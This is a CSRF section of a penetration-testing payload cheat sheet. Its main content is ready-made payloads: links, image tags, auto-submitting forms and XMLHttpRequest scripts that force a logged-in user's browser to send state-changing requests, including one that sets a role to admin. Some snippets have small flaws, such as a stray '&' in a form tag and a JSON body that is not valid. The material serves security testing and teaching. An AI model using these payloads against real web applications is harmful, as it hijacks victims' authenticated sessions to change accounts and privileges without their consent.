# Cross-Site Request Forgery

> Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP


## Summary

* [Methodology](#methodology)
* [Payloads](#payloads)

## Methodology

![CSRF_cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20injection/Images/CSRF-CheatSheet.png?raw=true)

## Payloads

### HTML GET – Requiring User Interaction for Proof-of-Concept

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```

### HTML GET (No User Interaction)

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

### HTML POST – Requiring User Interaction for Proof-of-Concept

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```

### HTML POST (AutoSubmit – No User Interaction)

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST"&>
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```


### JSON GET – Simple Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

### JSON POST – Simple Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

### JSON POST – Complex Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```


## References

- [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
- [Cross-Site Request Forgery (CSRF) - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
- [Messenger.com CSRF that show you the steps when you check for CSRF](https://whitton.io/articles/messenger-site-wide-csrf/) by Jack Whitton 
- [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack)](https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/) by Florian Courtial
- [Hacking PayPal Accounts with one click (Patched)](http://yasserali.com/hacking-paypal-accounts-with-one-click/) by Yasser Ali
- [Add tweet to collection CSRF](https://hackerone.com/reports/100820) by vijay kumar
- [Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/) by phwd
- [How i Hacked your Beats account ? Apple Bug Bounty](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/) by @aaditya_purani
- [FORM POST JSON: JSON CSRF on POST Heartbeats API](https://hackerone.com/reports/245346) by Dr.Jones
- [Hacking Facebook accounts using CSRF in Oculus-Facebook integration](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)